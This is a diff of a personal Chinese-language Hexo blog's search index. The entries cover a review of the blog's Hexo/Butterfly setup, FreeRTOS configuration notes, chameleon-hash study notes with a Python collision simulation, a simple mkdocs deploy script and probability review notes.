+数学与代码：MathJax 渲染公式，highlight.js 高亮，行号与自动换行启用。
+
+二、技术栈与版本
+Hexo: 7.3.0（package.json hexo 字段与依赖）
+主题：hexo-theme-butterfly 5.3.5（themes/butterfly/）
+渲染器：
+@upupming/hexo-renderer-markdown-it-plus（当前 Markdown 渲染主力）
+hexo-renderer-kramed（亦已安装，存在并行可能的冗余，见改进建议）
+hexo-renderer-stylus、hexo-renderer-pug
+
+
+生成/功能插件（节选）：
+搜索：hexo-generator-search、hexo-generator-searchdb（两者同时存在，见改进建议）
+站点生成：hexo-generator-index、archive、category、tag
+部署：hexo-deployer-git
+开发：hexo-server
+统计/字数：hexo-wordcount
+资源与多媒体：hexo-asset-image、hexo-tag-aplayer
+加密（可选）：hexo-blog-encrypt（暂未启用）
+主题内置/集成：pjax、instant.page、medium-zoom、canvas-nest、snackbar 等
+
+
+其他：@vercel/analytics 已安装但未在主题注入中显式启用。
+
+三、核心目录结构（简要）
+根配置
+_config.yml：站点全局配置（URL、构建、部署、数学、搜索、高亮、文章资源等）。
+_config.butterfly.yml：主题配置（导航、封面、UI、交互、评论、统计、特效等）。
+
+
+内容与数据
+source/_posts/：文章 Markdown（数量多，覆盖技术、竞赛、随笔等）。
+source/_data/link.yml：友链数据，按分类展示。
+source/link/index.md：友链页（type: link）。
+source/tags/index.md：标签页（type: tags）。
+source/music/index.md：音乐页（type: music，使用 aplayerlist）。
+source/schedule/index.md：常驻更新目录页（手工索引若干文章）。
+
+
+主题目录
+themes/butterfly/：主题源码、静态资源与内置脚本（包含本地搜索脚本）。
+
+
+
+四、主题与 UI 关键设置
+导航与菜单
+LOGO：/img/niu.gif
+菜单项：主页、时光轴（archives）、标签、友链
+顶部 Banner：index_img 与 default_top_img 均指向 /img/*.jpg|gif，默认封面集较大（94 张 gif）。
+
+
+列表与封面
+首页布局 index_layout: 3（封面与信息左右交错），简介展示长度 500。
+封面/侧栏/归档 cover 开启；aside 启用且默认在左侧。
+
+
+代码块
+主题 code_blocks: light、Mac 风格标题、可复制、行内换行。
+Hexo 使用 highlight.js（行号、wrap）。
+
+
+文章页
+TOC：开启且带序号、滚动百分比显示。
+版权信息：开启，协议为 CC BY-NC-SA 4.0。
+相关文章：开启，最多 6 篇。
+上/下一篇分页：顺序模式 1。
+
+
+侧栏卡片（已启用）
+作者卡片（Follow Me 指向 GitHub）
+公告（维护日志提示）
+最近文章（按更新时间）
+最新评论（Waline 聚合）
+分类/标签云/归档（月度）
+站点信息（文章数、最近推送时间、运行时长可配置）
+
+
+交互与视觉
+深色模式：按钮切换，手动模式。
+阅读模式：支持。
+PJAX：开启；Instant.page：开启；进入过渡动画：开启。
+图片灯箱：medium-zoom；Lightbox 在主题中设置为 medium_zoom。
+背景特效：canvas-nest（开启，移动端关闭），click_heart（开启）。
+Snackbar：开启；位置左下。
+
+
+
+五、功能清单（结合插件与配置）1) 搜索
+
+主题：local_search（占位文案“来搜吧来搜吧~”）。
+生成器：root _config.yml 配置 search.xml；同时安装了 search 与 searchdb 两个插件（建议二选一）。
+
+2) 评论与访问统计
+
+Waline：已配置 serverURL（Vercel 部署后端），开启 pageview &amp; visitor 统计；首页文章卡片展示评论数与 PV。
+Disqus：配置了 shortname，可作为备份/次要评论系统。
+站点级 PV/UV：Busuanzi 在主题配置中注释关闭（可按需启用）。
+
+3) 数学公式
+
+MathJax：在主题与站点均开启，单美元行内启用；engine 设为 chtml；支持按页面 Front-matter 控制。
+
+4) 代码高亮
+
+highlight.js：行号、自动换行、wrap 开启；主题 code_blocks=light。
+
+5) 多媒体与音乐
+
+页面级：source/music/index.md 使用 &#123;% aplayerlist %&#125; 播放清单。
+全站固定：通过主题 inject.bottom 注入 APlayer 与播放列表（随机播放、固定底部、自动播放）。
+
+6) 内容组织与导航
+
+TOC、相关文章、上一/下一篇导航、归档（月度）、标签云（随机顺序、上限 40）。
+友链：source/_data/link.yml 维护，主题友链样式为 volantis。
+
+7) 性能与体验
+
+PJAX、Instant.page 预获取、medium-zoom、snackbar；Lazyload 暂未启用。
+
+8) SEO 与结构化数据
+
+Open Graph：开启；结构化数据：开启。
+尚未安装/配置 RSS（feed）与 sitemap（站点地图）插件（见改进建议）。
+
+9) 安全与加密
+
+hexo-blog-encrypt 已安装，root _config.yml 示例配置注释存在；MathJax 跳过 encrypted/** 渲染；当前未启用文章加密。
+
+10) 部署与运维
+
+部署：hexo-deployer-git 推送到 git@github.com:coperlm/coperlm.github.io.git 的 main 分支。
+文章资源：post_asset_folder: true + hexo-asset-image，便于相对路径插图。
+
+六、构建、开发与部署
+本地开发（PowerShell）
+# 一次性安装依赖npm install# 本地预览（默认 http://localhost:4000）npm run server# 清理与重新生成npm run clean; npm run build# 部署（需已配置 SSH Key 并具备仓库写权限）npm run deploy
+
+新文档与资源组织
+
+新文章：hexo new &quot;标题&quot;（或直接在 source/_posts/ 下添加 .md）。
+文章素材：置于与文章同名的资源目录（post_asset_folder=true），图片可用相对路径引用。
+友链：编辑 source/_data/link.yml。
+专题页：tags/link/music/schedule 等页面通过 source/&lt;page&gt;/index.md + Front-matter 管理。
+
+
+
+七、性能与可用性观察
+优点
+
+PJAX + Instant.page 使页面切换与首次交互更敏捷。
+TOC/相关文章/阅读模式/深色模式增强了长文可读性与导航性。
+APlayer 固定播放器提升沉浸感（需注意流量与带宽）。
+
+
+关注点
+
+封面图/默认图较多（近百张 gif），首页首屏资源体量可能较大；建议按需精简或延迟加载。
+Lazyload 关闭：在多图文章/长列表页会影响 FCP/LCP，可考虑开启主题 lazyload 或采用现代原生 lazy 属性。
+canvas-nest、click-heart 等特效在低端设备上可能影响帧率；移动端已禁用 nest，较为稳妥。
+
+
+
+八、安全与隐私
+Waline（自建/托管后端）
+已启用匿名评论与 PV/UV 统计；建议在 Waline 后端开启基础反垃圾与速率限制，关注数据合规性。
+
+
+Disqus
+作为备份评论系统；注意其隐私政策与被墙风险。
+
+
+加密文章
+已具备能力但未启用；如需发布敏感内容，可启用 hexo-blog-encrypt 并为分类/标签设置访问密码。
+
+
+
+九、问题与改进清单（可执行）1) Markdown 渲染器冗余
+
+同时安装了 markdown-it-plus 与 kramed；建议只保留一个（推荐 markdown-it-plus），并移除 hexo-renderer-kramed 与 root 中的 kramed: 配置，以避免行为不一致。
+
+2) 搜索插件重复
+
+hexo-generator-search 与 hexo-generator-searchdb 同时存在；推荐仅保留一个：
+若主题 local_search 读取 search.xml，保留 hexo-generator-search；
+或改为使用 searchdb（生成 search.json），并在主题中对应配置。
+
+
+
+3) SEO 能力完善
+
+增加 RSS 与站点地图：
+hexo-generator-feed（RSS/Atom）
+hexo-generator-sitemap（sitemap.xml）
+
+
+
+4) 统计与分析
+
+如需更细化的访问分析，可启用：
+Vercel Analytics（已安装包，需在主题 head/bottom 注入脚本）
+或 Umami/GA4/Clarity 等（主题已预留配置项）。
+
+
+
+5) 性能优化
+
+开启图片 Lazyload；
+精简默认封面 GIF 数量或改用静态 WebP；
+评估 APlayer 自动播放策略（移动端/低速网络条件下可考虑关闭自动播放）。
+
+6) PWA 与离线
+
+如有离线访问/安装到桌面的诉求，可启用主题 pwa 并补齐 manifest 与图标资源。
+
+7) 代码高亮统一性
+
+当前使用 highlight.js；若希望与 Butterfly 内置 Prism 生态更一致，可切换至 Prism 并开启按需加载（权衡体积与功能）。
+
+十、快速问答（FAQ）
+本地搜索无结果？
+
+确认运行了 hexo generate 生成 search.xml|json；若装了两个搜索生成器，保留一个并与主题配置一致。
+
+
+文章公式不渲染？
+
+确认 Front-matter 未关闭 mathjax；加密路径（encrypted/**）默认跳过渲染。
+
+
+图片 404 或不显示？
+
+使用 post_asset_folder: true 时，建议将图片放在与文章同名的资源目录下并用相对路径引用；主题 error_img 会为断图提供默认占位图。
+
+
+评论数/访客数未显示？
+
+检查 Waline serverURL 可用性与跨域设置，确认主题 comments.count/pageview 已启用；首页卡片统计需等待首批上报后才会有值。
+
+
+
+十一、结论该博客以 Butterfly 为基础，完成了从内容到交互的较完整搭建：
+
+对技术内容（数学、密码学、算法）有友好的公式/代码支持与导航增强；
+评论、搜索、多媒体与视觉动效到位，使用体验较好；
+在 SEO、性能与插件冗余方面仍有可量化的优化空间（RSS/Sitemap、Lazyload、渲染器与搜索插件精简）。
+
+]]></content>
+      <categories>
+        <category>技术学习笔记</category>
+      </categories>
+      <tags>
+        <tag>misc</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hal库c6t6 Freerots</title>
+    <url>/2024/11/08/hal%E5%BA%93c6t6-Freerots/</url>
+    <content><![CDATA[写篇博客，不为别的，就怕以后忘了咋整了
+Freerots这玩意忒好用了
+
+如何开FreerotsSYS这边选个时钟
+
+然后如图一路选下来，别忘了添加任务
+
+其他的常规配置，然后生成代码就可以了
+打开freertos.c文件，正常加入点灯代码就可以了
+
+以上内容的参考：
+https://www.cnblogs.com/Meiyangyang945/p/15106513.html
+
+报错1
+买不起好芯片，内存不够
+改一下代码里的内容
+将#define configTOTAL_HEAP_SIZE                    ((size_t)10240)
+修改为#define configTOTAL_HEAP_SIZE                    ((size_t)(1024*5)即可
+参考：
+https://blog.csdn.net/king110108/article/details/110038173
+https://file.elecfans.com/web2/M00/9B/99/pYYBAGQip7KAOU2vAAfDySG_a10157.pdf
+报错2
+一大堆啥玩意哇
+贴搜索引擎一看，是cpp导致的
+
+魔术棒中把misc_controls的--cpp11去掉即可
+参考：
+https://blog.csdn.net/timberman666/article/details/132723352
+报错3数日之后，又出现了报错2的内容
+改成多少都没用了
+开O2优化即可
+]]></content>
+      <categories>
+        <category>电控</category>
+      </categories>
+      <tags>
+        <tag>RoboMaster</tag>
       </tags>
   </entry>
   <entry>
@@ -4273,83 +4273,6 @@ ATTENDATION
       </tags>
   </entry>
   <entry>
-    <title>变色龙哈希学习笔记</title>
-    <url>/2024/11/24/%E5%8F%98%E8%89%B2%E9%BE%99%E5%93%88%E5%B8%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[用于记录变色龙哈希的学习历程
-没写完，不打算写了~
-
-Chameleon Hashing and Signatures作者：Hugo Krawczyk, Tal Rabin
-时间：1997
-
-Based on Claw-free Trapdoor PermutationsGeneral Construction计算过程
-
-实验代码#基于线性方程进行模拟import randomimport gmpy2from Crypto.Util.number import *a = 0 ; b = 0 ; c = 0 ; d = 0 ; p = 0def init():    global a, b, c, d, p    p = getPrime(512)    while True:        a = random.randint(1, 2**512)        c = random.randint(1, 2**512)        if gmpy2.gcd(a, p) == 1 and gmpy2.gcd(c, p) == 1:  # 确保 a 和 c 与 p 互质            break    b = random.randint(1, 2**512)    d = random.randint(1, 2**512)# 线性变换函数def f1(x):    return (a * x + b) % pdef f2(x):    return (c * x + d) % p# 线性变换逆函数def inv_f1(y):    return (y - b) * gmpy2.invert(a, p) % pdef inv_f2(y):    return (y - d) * gmpy2.invert(c, p) % pif __name__ == &#x27;__main__&#x27;:    init()    m1 = bytes_to_long(b&#x27;flag&#123;Chameleon_Hash_is_good&#125;&#x27;)    r1 = random.randint( 1 , p - 1 )    # 计算 H(m1, r1)    H = r1    for i in str(bin(m1)[2:]):        if i == &#x27;1&#x27;:            H = f1(H)        else:            H = f2(H)    print(f&quot;H(m1, r1): &#123;H&#125;&quot;)    m2 = bytes_to_long(b&#x27;flag&#123;I_agree_with_msg1&#125;&#x27;)    # 构造新的随机数 r2，使 H(m1, r1) = H(m2, r2)    r2 = H    for i in reversed(str(bin(m2)[2:])):  # 逆序推回原随机数        if i == &#x27;1&#x27;:            r2 = inv_f1(r2)        else:            r2 = inv_f2(r2)    print(f&quot;Recovered r2: &#123;r2&#125;&quot;)    # 验证碰撞：计算 H(m2, r2)    H2 = r2    for i in str(bin(m2)[2:]):        if i == &#x27;1&#x27;:            H2 = f1(H2)        else:            H2 = f2(H2)    print(f&quot;H(m2, r2): &#123;H2&#125;&quot;)    # 验证碰撞结果    if H == H2:        print(&quot;Hash collision successful!&quot;)    else:        print(&quot;Hash collision failed!&quot;)
-Based on the Intractability of Factoring系统参数
-计算过程
-
-困难问题该问题的核心为平方根的计算，可以规约到因数分解问题
-给定 $n = p \cdot q$ 和一个整数 $y \in \mathbb{Z}_n$，想要找到 $x \in \mathbb{Z}_n$ 使得：
-
-x^2 \equiv y \mod n也就是计算 $y$ 在模 $n$ 下的平方根。
-这在一般情况下是一个困难的问题，除非知道 $n$ 的两个素因数 $p$ 和 $q$。
-
-实验代码#总是有问题，后面再解决
-Based on Discrete Log系统参数
-计算过程
-推导已知 $CH(m,r) = g^m\cdot y^r$
-即 $CH(m,r) = g^m\cdot g^{x\cdot r} = g^{m+x\cdot r}$
-故令 $CH(m’,r’)\equiv CH(m,r)\mod p$
-有 $g^{m’+x\cdot r’}\equiv g^{m+x\cdot r}\mod p$
-即 $m’+x\cdot r’\equiv m+x\cdot r\mod q$
-移项得到 $r’\equiv r+\frac{m-m’}{x}\mod q$
-实验代码#具体见比赛代码SK = random.randint(1, q)PK = pow( g , x , p )r1 = random.randint(1, q)CH = pow( g , h , p ) * pow( PK , r1 , p ) % pr2 = exgcd(SK,q)[0] * ( H(m1) - H(M2) + SK * r1 ) % q
-Chameleon Signature SchemesChameleon Signing签名步骤
-验证步骤
-争议解决
-EnhancementsThe recipient’s identity签名时不仅绑定消息的哈希值，还绑定接收者 RRR 的身份 $id_R$。这样可以避免签名者更改签名中的身份信息。
-Exposure-freenessMemory requirementsSecurity RequirementsA Full Chameleon Signature SchemeAlgorithm
-
-
-Chameleon Hashing without Key Exposure作者：Xiaofeng Chen
-时间：2004
-
-Preliminary WorksGap Diffie-Hellman Group设 $G$ 是一个由生成元 $g$ 生成的循环乘法群，其阶数为素数 $q$。假设 $G$ 上的求逆运算和乘法运算可以高效完成。在这样的群 $G$ 上，定义以下三个问题：
-
-一个群 $G$ 被称为 Gap Diffie-Hellman 群，如果：
-
-判定性 Diffie-Hellman 问题（DDHP）可以在多项式时间内高效解决。
-计算性 Diffie-Hellman 问题（CDHP）在没有特殊辅助信息的情况下没有多项式时间算法能够解决。
-
-换句话说，在这样的群中，验证 $g^c = g^{ab}$ 是简单的，但直接计算$g^{ab}$ 是困难的。
-Chameleon HashingComposition
-
-Security properties
-Mention“Key Exposure Problem” is not but——
-
-（这一条存疑）
-how to key_exp
-CH(m)=g^{m+x\cdot r} \\
-CH(m')=g^{m'+x\cdot r'}$g$是系统公共参数，已知
-
-\begin{flalign}
-已知&\ g^my^r=g^{m'}y^{r'}\\
-所以有&\ g^mg^{x\cdot r}=g^{m'}y^{x\cdot r'}\\
-则有&\ m+x\cdot r=m'+x\cdot r'\\
-移项得到&\ x=\frac{m-m'}{r'-r}
-\end{flalign}On the Key Exposure Problem in Chameleon Hashes作者：Giuseppe Ateniese
-时间：2004
-
-Introduction上一篇论文提供了一种密钥无暴露变色龙哈希函数的具体构造，该函数在具有双线性配对的 Gap 群设置下工作。虽然这无疑是密钥无暴露变色龙哈希的第一个完整构造，但它并没有解决是否存在基于其他加密假设或更高效方案的构造的问题，例如与 [12] 中的原始变色龙哈希函数具有可比性能的构造。
-Ateniese, G., de Medeiros, B.:Identity-based chameleon hash and applications.In Fi-nancial Cryptography 2004. LNCS 3110, Springer-Verlag (2004) 164–180. Available online athttp://eprint.iacr.org/2003/167/.
-]]></content>
-      <categories>
-        <category>科研</category>
-      </categories>
-      <tags>
-        <tag>Crypto</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>各式各样的DH</title>
     <url>/2024/10/08/%E5%90%84%E5%BC%8F%E5%90%84%E6%A0%B7%E7%9A%84DH/</url>
     <content><![CDATA[阅读《Identity-Based Chameleon Hashing and  Signatures Without Key Exposure》一文时，遇到了Decision Diffie-Hellman Problem (DDHP)这一概念，头一次遇到，便搜索了一下，打算学习学习；没想到捅了老挝——一个DH密钥交换算法能衍生出各式各样的东东
@@ -4538,6 +4461,83 @@ DDHP的目标是判断 $cP=abP$ 是否成立
       </categories>
       <tags>
         <tag>随笔</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>变色龙哈希学习笔记</title>
+    <url>/2024/11/24/%E5%8F%98%E8%89%B2%E9%BE%99%E5%93%88%E5%B8%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[用于记录变色龙哈希的学习历程
+没写完，不打算写了~
+
+Chameleon Hashing and Signatures作者：Hugo Krawczyk, Tal Rabin
+时间：1997
+
+Based on Claw-free Trapdoor PermutationsGeneral Construction计算过程
+
+实验代码#基于线性方程进行模拟import randomimport gmpy2from Crypto.Util.number import *a = 0 ; b = 0 ; c = 0 ; d = 0 ; p = 0def init():    global a, b, c, d, p    p = getPrime(512)    while True:        a = random.randint(1, 2**512)        c = random.randint(1, 2**512)        if gmpy2.gcd(a, p) == 1 and gmpy2.gcd(c, p) == 1:  # 确保 a 和 c 与 p 互质            break    b = random.randint(1, 2**512)    d = random.randint(1, 2**512)# 线性变换函数def f1(x):    return (a * x + b) % pdef f2(x):    return (c * x + d) % p# 线性变换逆函数def inv_f1(y):    return (y - b) * gmpy2.invert(a, p) % pdef inv_f2(y):    return (y - d) * gmpy2.invert(c, p) % pif __name__ == &#x27;__main__&#x27;:    init()    m1 = bytes_to_long(b&#x27;flag&#123;Chameleon_Hash_is_good&#125;&#x27;)    r1 = random.randint( 1 , p - 1 )    # 计算 H(m1, r1)    H = r1    for i in str(bin(m1)[2:]):        if i == &#x27;1&#x27;:            H = f1(H)        else:            H = f2(H)    print(f&quot;H(m1, r1): &#123;H&#125;&quot;)    m2 = bytes_to_long(b&#x27;flag&#123;I_agree_with_msg1&#125;&#x27;)    # 构造新的随机数 r2，使 H(m1, r1) = H(m2, r2)    r2 = H    for i in reversed(str(bin(m2)[2:])):  # 逆序推回原随机数        if i == &#x27;1&#x27;:            r2 = inv_f1(r2)        else:            r2 = inv_f2(r2)    print(f&quot;Recovered r2: &#123;r2&#125;&quot;)    # 验证碰撞：计算 H(m2, r2)    H2 = r2    for i in str(bin(m2)[2:]):        if i == &#x27;1&#x27;:            H2 = f1(H2)        else:            H2 = f2(H2)    print(f&quot;H(m2, r2): &#123;H2&#125;&quot;)    # 验证碰撞结果    if H == H2:        print(&quot;Hash collision successful!&quot;)    else:        print(&quot;Hash collision failed!&quot;)
+Based on the Intractability of Factoring系统参数
+计算过程
+
+困难问题该问题的核心为平方根的计算，可以规约到因数分解问题
+给定 $n = p \cdot q$ 和一个整数 $y \in \mathbb{Z}_n$，想要找到 $x \in \mathbb{Z}_n$ 使得：
+
+x^2 \equiv y \mod n也就是计算 $y$ 在模 $n$ 下的平方根。
+这在一般情况下是一个困难的问题，除非知道 $n$ 的两个素因数 $p$ 和 $q$。
+
+实验代码#总是有问题，后面再解决
+Based on Discrete Log系统参数
+计算过程
+推导已知 $CH(m,r) = g^m\cdot y^r$
+即 $CH(m,r) = g^m\cdot g^{x\cdot r} = g^{m+x\cdot r}$
+故令 $CH(m’,r’)\equiv CH(m,r)\mod p$
+有 $g^{m’+x\cdot r’}\equiv g^{m+x\cdot r}\mod p$
+即 $m’+x\cdot r’\equiv m+x\cdot r\mod q$
+移项得到 $r’\equiv r+\frac{m-m’}{x}\mod q$
+实验代码#具体见比赛代码SK = random.randint(1, q)PK = pow( g , x , p )r1 = random.randint(1, q)CH = pow( g , h , p ) * pow( PK , r1 , p ) % pr2 = exgcd(SK,q)[0] * ( H(m1) - H(M2) + SK * r1 ) % q
+Chameleon Signature SchemesChameleon Signing签名步骤
+验证步骤
+争议解决
+EnhancementsThe recipient’s identity签名时不仅绑定消息的哈希值，还绑定接收者 RRR 的身份 $id_R$。这样可以避免签名者更改签名中的身份信息。
+Exposure-freenessMemory requirementsSecurity RequirementsA Full Chameleon Signature SchemeAlgorithm
+
+
+Chameleon Hashing without Key Exposure作者：Xiaofeng Chen
+时间：2004
+
+Preliminary WorksGap Diffie-Hellman Group设 $G$ 是一个由生成元 $g$ 生成的循环乘法群，其阶数为素数 $q$。假设 $G$ 上的求逆运算和乘法运算可以高效完成。在这样的群 $G$ 上，定义以下三个问题：
+
+一个群 $G$ 被称为 Gap Diffie-Hellman 群，如果：
+
+判定性 Diffie-Hellman 问题（DDHP）可以在多项式时间内高效解决。
+计算性 Diffie-Hellman 问题（CDHP）在没有特殊辅助信息的情况下没有多项式时间算法能够解决。
+
+换句话说，在这样的群中，验证 $g^c = g^{ab}$ 是简单的，但直接计算$g^{ab}$ 是困难的。
+Chameleon HashingComposition
+
+Security properties
+Mention“Key Exposure Problem” is not but——
+
+（这一条存疑）
+how to key_exp
+CH(m)=g^{m+x\cdot r} \\
+CH(m')=g^{m'+x\cdot r'}$g$是系统公共参数，已知
+
+\begin{flalign}
+已知&\ g^my^r=g^{m'}y^{r'}\\
+所以有&\ g^mg^{x\cdot r}=g^{m'}y^{x\cdot r'}\\
+则有&\ m+x\cdot r=m'+x\cdot r'\\
+移项得到&\ x=\frac{m-m'}{r'-r}
+\end{flalign}On the Key Exposure Problem in Chameleon Hashes作者：Giuseppe Ateniese
+时间：2004
+
+Introduction上一篇论文提供了一种密钥无暴露变色龙哈希函数的具体构造，该函数在具有双线性配对的 Gap 群设置下工作。虽然这无疑是密钥无暴露变色龙哈希的第一个完整构造，但它并没有解决是否存在基于其他加密假设或更高效方案的构造的问题，例如与 [12] 中的原始变色龙哈希函数具有可比性能的构造。
+Ateniese, G., de Medeiros, B.:Identity-based chameleon hash and applications.In Fi-nancial Cryptography 2004. LNCS 3110, Springer-Verlag (2004) 164–180. Available online athttp://eprint.iacr.org/2003/167/.
+]]></content>
+      <categories>
+        <category>科研</category>
+      </categories>
+      <tags>
+        <tag>Crypto</tag>
       </tags>
   </entry>
   <entry>
@@ -5556,6 +5556,29 @@ PPT还是要拍（不然确实太闲了哇），然后直接丢给豆包总结�
       </tags>
   </entry>
   <entry>
+    <title>我算是研究明白了mkdocs的部署逻辑了</title>
+    <url>/2025/11/29/%E6%88%91%E7%AE%97%E6%98%AF%E7%A0%94%E7%A9%B6%E6%98%8E%E7%99%BD%E4%BA%86mkdocs%E7%9A%84%E9%83%A8%E7%BD%B2%E9%80%BB%E8%BE%91%E4%BA%86/</url>
+    <content><![CDATA[最近在搭建知识库，然后捣鼓了这个mkdocs
+先从头说，首先是配置环境，直接pip install即可
+估计是直接上传到pip可以直接获取的地方了，这样一install然后全部依赖就都有了
+然后是新建一个知识库，最后部署用的是mkdocs gh-deploy，或者本地预览用mkdocs build。
+这个mkdocs gh-deploy的逻辑是把编译成html的文件放在.\site\目录下，然后上传到分支
+
+但是主分支不会变
+于是乎写了个批处理，直接丢环境变量里面了
+#!/bin/bash# 进入指定的目录cd /home/coper/KnowledgeBase/ || exit 1# 执行 git 操作git add .git commit -m &quot;Auto Commit&quot;git push# 部署 MkDocsmkdocs gh-deploy
+同时，为了避免重复上传，还需要把./site/加入到.gitignore中
+这样，就完成了一键部署
+]]></content>
+      <categories>
+        <category>未分类</category>
+      </categories>
+      <tags>
+        <tag>unfixed</tag>
+        <tag>None</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>我也是有知识库的人了</title>
     <url>/2025/11/29/%E6%88%91%E4%B9%9F%E6%98%AF%E6%9C%89%E7%9F%A5%E8%AF%86%E5%BA%93%E7%9A%84%E4%BA%BA%E4%BA%86/</url>
     <content><![CDATA[RT
@@ -6442,84 +6465,6 @@ Q5：文章里怎么有“需要密码”？
       </tags>
   </entry>
   <entry>
-    <title>概率论一轮复习</title>
-    <url>/2024/12/28/%E6%A6%82%E7%8E%87%E8%AE%BA%E4%B8%80%E8%BD%AE%E5%A4%8D%E4%B9%A0/</url>
-    <content><![CDATA[记录概率论的学习内容
-
-目录
-
-一、随机事件和概率
-
-1.古典概型2.几何概型3.重要公式4.独立性判定二、一维随机变量及其分布
-1.判分布随机变量：$X:\Omega\rightarrow\mathbb{R}$
-分布函数：$X\sim F(x),F(x)=P(X\leq x),F(x)\in[0,1]$
- 
-对于连续型$F(x)=\int_{-\infty}^{x}f(t)dt,x\in\mathbb{R}$
-
-
-\left\{
-\begin{align}
-&F(-\infty)=0,\\
-&F(+\infty)=1,\\
-&\sum_ip_i=1,\\
-&\int_{-\infty}^{+\infty}f(x)dx=1
-\end{align}
-\right.
-A
-
-
-B选项解法二：也可以使用部分积分公式$\int udv=uv-\int vdu$
-部分积分公式推导过程
-其中：$u=v=F(x)$
-带入部分积分公式：$\int F(x) dF(x)=[F(x)F(x)]|_{-\infty}^{+\infty}−\int F(x)dF(x)$
-故 $\int F(x) dF(x)=\frac{1}{2}$
-则 $g_2(x)$ 可以作为概率密度
-$g_1(x),g_2(x),g_3(x)$可以作为概率密度， $g_4(x)$ 不能作为概率密度
-C
-2.求分布
-离散型分布
-
-0-1分布 $X\sim B(1,p),X(伯努利计数变量)\sim \left(\begin{array}{l}0&amp;\quad1\p&amp;1-p\end{array}\right)$
-
-二项分布 $X\sim B(n,p)$ 分布律 $U_k=P{X=k}=C_n^kp^k(1-p)^{n-k}$
-
-几何分布 $X\sim G(p)$ 首中即停止 $P{X=k}=p\cdot (1-p)^{k-1}$
-无记忆性
-
-超几何分布
-
-柏松分布 稀有事件的概率 $P{X=k}=\frac{\lambda^k}{k!}e^{-\lambda}$，$EX=\lambda$
-
-
-
-泊松定理 若$X\sim B(n,p)$，当$n$很大，$p$很小，$\lambda=np$ 适中时，二项分布可用泊松分布近似表示；一般地，当$n&gt;20,p100,np&lt;10$ 时，逼近效果更佳
-
-C_n^kp^k(1-p)^{n-k}\approx\frac{\lambda^k}{k!}e^{-\lambda}
-
-\begin{align}
-\because\ &Z\sim B(2,\frac13)\\
-&X+Y+Z=2\\
-\therefore\ &X+Y=2-Z\sim B(2,\frac23)
-\end{align}B
-
-8
-
-
-D
-
-连续型分布
-
-均匀分布 $X\sim U(a,b)$
-
-f(x)=\left\{\begin{align}&\frac1{b-a},a]]></content>
-      <categories>
-        <category>课程与考试重点</category>
-      </categories>
-      <tags>
-        <tag>mathematics</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>机器人联盟赛/对抗赛游记回忆记录</title>
     <url>/2024/10/31/%E6%9C%BA%E5%99%A8%E4%BA%BA%E8%81%94%E7%9B%9F%E8%B5%9B-%E5%AF%B9%E6%8A%97%E8%B5%9B%E6%B8%B8%E8%AE%B0%E5%9B%9E%E5%BF%86%E8%AE%B0%E5%BD%95/</url>
     <content><![CDATA[整理游记和会议记录的时候，发现机器人比赛的高校联盟赛和超级对抗赛的游记我没有写过，故凭借记忆（和手机相册）补一份
@@ -6612,6 +6557,84 @@ f(x)=\left\{\begin{align}&\frac1{b-a},a]]></content>
       <tags>
         <tag>RoboMaster</tag>
         <tag>游记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>概率论一轮复习</title>
+    <url>/2024/12/28/%E6%A6%82%E7%8E%87%E8%AE%BA%E4%B8%80%E8%BD%AE%E5%A4%8D%E4%B9%A0/</url>
+    <content><![CDATA[记录概率论的学习内容
+
+目录
+
+一、随机事件和概率
+
+1.古典概型2.几何概型3.重要公式4.独立性判定二、一维随机变量及其分布
+1.判分布随机变量：$X:\Omega\rightarrow\mathbb{R}$
+分布函数：$X\sim F(x),F(x)=P(X\leq x),F(x)\in[0,1]$
+ 
+对于连续型$F(x)=\int_{-\infty}^{x}f(t)dt,x\in\mathbb{R}$
+
+
+\left\{
+\begin{align}
+&F(-\infty)=0,\\
+&F(+\infty)=1,\\
+&\sum_ip_i=1,\\
+&\int_{-\infty}^{+\infty}f(x)dx=1
+\end{align}
+\right.
+A
+
+
+B选项解法二：也可以使用部分积分公式$\int udv=uv-\int vdu$
+部分积分公式推导过程
+其中：$u=v=F(x)$
+带入部分积分公式：$\int F(x) dF(x)=[F(x)F(x)]|_{-\infty}^{+\infty}−\int F(x)dF(x)$
+故 $\int F(x) dF(x)=\frac{1}{2}$
+则 $g_2(x)$ 可以作为概率密度
+$g_1(x),g_2(x),g_3(x)$可以作为概率密度， $g_4(x)$ 不能作为概率密度
+C
+2.求分布
+离散型分布
+
+0-1分布 $X\sim B(1,p),X(伯努利计数变量)\sim \left(\begin{array}{l}0&amp;\quad1\p&amp;1-p\end{array}\right)$
+
+二项分布 $X\sim B(n,p)$ 分布律 $U_k=P{X=k}=C_n^kp^k(1-p)^{n-k}$
+
+几何分布 $X\sim G(p)$ 首中即停止 $P{X=k}=p\cdot (1-p)^{k-1}$
+无记忆性
+
+超几何分布
+
+柏松分布 稀有事件的概率 $P{X=k}=\frac{\lambda^k}{k!}e^{-\lambda}$，$EX=\lambda$
+
+
+
+泊松定理 若$X\sim B(n,p)$，当$n$很大，$p$很小，$\lambda=np$ 适中时，二项分布可用泊松分布近似表示；一般地，当$n&gt;20,p100,np&lt;10$ 时，逼近效果更佳
+
+C_n^kp^k(1-p)^{n-k}\approx\frac{\lambda^k}{k!}e^{-\lambda}
+
+\begin{align}
+\because\ &Z\sim B(2,\frac13)\\
+&X+Y+Z=2\\
+\therefore\ &X+Y=2-Z\sim B(2,\frac23)
+\end{align}B
+
+8
+
+
+D
+
+连续型分布
+
+均匀分布 $X\sim U(a,b)$
+
+f(x)=\left\{\begin{align}&\frac1{b-a},a]]></content>
+      <categories>
+        <category>课程与考试重点</category>
+      </categories>
+      <tags>
+        <tag>mathematics</tag>
       </tags>
   </entry>
   <entry>
@@ -7950,19 +7973,6 @@ https://github.com/azl397985856/cf
       </tags>
   </entry>
   <entry>
-    <title>计算机组成原理学习笔记</title>
-    <url>/2025/09/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[
-
-]]></content>
-      <categories>
-        <category>考研</category>
